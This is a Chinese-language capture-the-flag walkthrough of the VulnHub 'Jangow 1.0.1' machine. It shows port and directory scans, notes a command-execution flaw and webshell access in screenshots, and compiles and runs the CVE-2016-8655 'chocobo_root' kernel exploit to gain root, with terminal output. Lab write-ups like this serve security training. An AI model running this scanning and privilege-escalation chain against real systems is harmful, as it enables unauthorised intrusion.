---
sidebar_position: 2
tags: [Easy, Linux, 命令执行, CVE]
title: "Jangow: 1.0.1"
sidebar_label: "Jangow: 1.0.1"
---
# Jangow: 1.0.1
## 端口扫描
```bash
jtz@attacker:~/CTF/VulhHub$ nmap -sTCV -p- --min-rate 1000 192.168.1.6
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-16 21:43 CST
Nmap scan report for jangow01 (192.168.1.6)
Host is up (0.0034s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Index of /
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-06-10 18:05  site/
|_
Service Info: Host: 127.0.0.1; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.97 seconds
```
## 80
```bash
jtz@attacker:~/CTF/VulhHub$ feroxbuster -u http://192.168.1.6/site -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.10.1
───────────────────────────┬──────────────────────
     Target Url            │ http://192.168.1.6/site
     Threads               │ 50
     Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
     Status Codes          │ All Status Codes!
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.10.1
     Extract Links         │ true
     Extensions            │ [php, txt, html]
     HTTP methods          │ [GET]
     Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      309c http://192.168.1.6/site => http://192.168.1.6/site/
200      GET        8l       29w    28898c http://192.168.1.6/site/assets/favicon.ico
200      GET      106l      659w    26989c http://192.168.1.6/site/assets/img/demo-image-01.jpg
200      GET      492l     2733w   186437c http://192.168.1.6/site/assets/img/demo-image-02.jpg
200      GET      949l     4824w   385662c http://192.168.1.6/site/assets/img/bg-masthead.jpg
200      GET      679l     4637w   425261c http://192.168.1.6/site/assets/img/ipad.png
301      GET        9l       28w      319c http://192.168.1.6/site/wordpress => http://192.168.1.6/site/wordpress/
200      GET    11253l    21663w   207746c http://192.168.1.6/site/css/styles.css
200      GET     2608l    13994w   956051c http://192.168.1.6/site/assets/img/bg-signup.jpg
301      GET        9l       28w      312c http://192.168.1.6/site/js => http://192.168.1.6/site/js/
200      GET       54l      134w     1644c http://192.168.1.6/site/js/scripts.js
200      GET        1l        0w        1c http://192.168.1.6/site/busque.php
200      GET      173l      663w    10190c http://192.168.1.6/site/index.html
301      GET        9l       28w      316c http://192.168.1.6/site/assets => http://192.168.1.6/site/assets/
301      GET        9l       28w      313c http://192.168.1.6/site/css => http://192.168.1.6/site/css/
200      GET      173l      663w    10190c http://192.168.1.6/site/wordpress/index.html
200      GET        1l       10w       87c http://192.168.1.6/site/wordpress/config.php
```
之后我在页面开始进行了一系列的搜索, 但是我没有发现什么可以利用的地方, 经过一系列探索后, 我发现其中存在一个命令执行的地方
![20240524132906](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524132906.png)
## 后渗透
### www-data
虽然我发现了命令执行的地方, 但是一直没有获取到 Shell, 所以我下载了蚁剑, 并使用其来帮助我进行利用
![20240524132932](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524132932.png)
> 傻逼蚁剑, 不知道什么鬼, 就是连接不上, 一直就有这个问题, 果然集成工具不靠谱

### www-data —> jangow01
在我对网站目录进行搜寻时, 我发现一个特殊的备份文件, 从中获取到了 jangow01 的密码
![20240524133015](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524133015.png)

![20240524133027](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524133027.png)

### jangow01 —> root
上传 Linpeas 进行执行后, 发现了几个 CVE 漏洞
![20240524133053](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524133053.png)
之后经过了一系列的搜索之后, 我确认了, 使用 [CVE-2016-8655](https://github.com/bcoles/kernel-exploits/tree/master/CVE-2016-8655)
```bash
(remote) jangow01@jangow01:/tmp$ gcc chocobo_root.c -o chocobo_root -lpthread -Wall
(remote) jangow01@jangow01:/tmp$ ls
chocobo_root  chocobo_root.c  linpeas.sh  systemd-private-8d9e565a1d2046a4af825a7685debc73-systemd-timesyncd.service-Qd25nD  tmux-1000
(remote) jangow01@jangow01:/tmp$ ./chocobo_root 
linux AF_PACKET race condition exploit by rebel
.........
root@jangow01:/tmp# 
root@jangow01:/tmp# id
uid=0(root) gid=0(root) grupos=0(root),1000(desafio02)
```
## 扩展
### 端口限制
在我们尝试获取 Reverse Shell 时, 我们可以发现对应的是无法获取的, 这里是因为目标端防火墙做了一些限制, 我们需要经过一些探测才可以确定对应的端口为 443 